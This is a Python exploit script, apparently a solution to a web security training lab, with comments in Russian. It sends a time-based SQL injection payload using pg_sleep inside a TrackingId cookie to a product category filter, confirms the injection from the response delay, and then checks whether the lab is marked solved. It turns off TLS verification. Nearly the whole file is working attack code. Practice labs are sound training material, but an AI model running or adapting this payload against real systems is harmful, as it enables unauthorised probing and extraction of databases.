import sys
import time
import logging
import argparse
import urllib3
import requests
import os

# Настройка прокси через переменные окружения
PROXIES = {
    "http": os.getenv("HTTP_PROXY", "127.0.0.1:8080"),
    "https": os.getenv("HTTPS_PROXY", "127.0.0.1:8080"),
}

log = logging.getLogger(__name__)
logging.basicConfig(
    stream=sys.stdout,
    level=logging.INFO,
    format="{asctime} [{threadName}] [{levelname}][{name}] {message}",
    style="{",
    datefmt="%H:%M:%S",
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_args(args: list):
    parser = argparse.ArgumentParser(description="Exploit script for time-based SQL injection.")
    parser.add_argument(
        "-n", "--no-proxy", default=False, action="store_true", help="do not use proxy"
    )
    parser.add_argument("url", help="URL of the lab")
    return parser.parse_args(args)


def normalize_url(url: str) -> str:
    """Ensure the URL ends with a slash."""
    return url if url.endswith("/") else url + "/"


def retrieve_contents(url: str, no_proxy: bool) -> bool:
    """Check if the lab is solved by retrieving the page content."""
    log.info("Checking if the lab is solved...")
    try:
        with requests.get(url, proxies=None if no_proxy else PROXIES, verify=False) as resp:
            if "Congratulations, you solved the lab!" in resp.text:
                log.info("Lab is solved!")
                return True
    except requests.RequestException as e:
        log.error(f"Failed to retrieve contents: {e}")
    return False


def is_solved(url: str, no_proxy: bool) -> bool:
    """Check if the lab is solved with a retry mechanism."""
    if retrieve_contents(url, no_proxy):
        return True
    time.sleep(2)
    return retrieve_contents(url, no_proxy)


def send_exploit(url: str, no_proxy: bool) -> bool:
    exploit_payload = "xyz'+||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END)--"
    exploit_url = url + "filter?category=Lifestyle"
    cookies = {"TrackingId": exploit_payload}

    log.info(f"Sending SQLi payload in cookie to {exploit_url}")
    try:
        with requests.get(exploit_url, cookies=cookies, proxies=None if no_proxy else PROXIES, verify=False) as resp:
            if resp.elapsed.total_seconds() >= 10:
                log.info("Time-based SQLi successful! The payload caused a delay.")
                return True
            else:
                log.info("SQLi payload did not trigger a delay.")
                return False
    except requests.RequestException as e:
        log.error(f"Failed to send exploit: {e}")
        return False


def main(args):
    url = normalize_url(args.url)
    if send_exploit(url, args.no_proxy):
        if is_solved(url, args.no_proxy):
            log.info("Congrats! The lab is solved.")
        else:
            log.info("Not solved yet.")
    else:
        log.info("Exploit failed.")


if __name__ == "__main__":
    args = parse_args(sys.argv[1:])
    main(args)
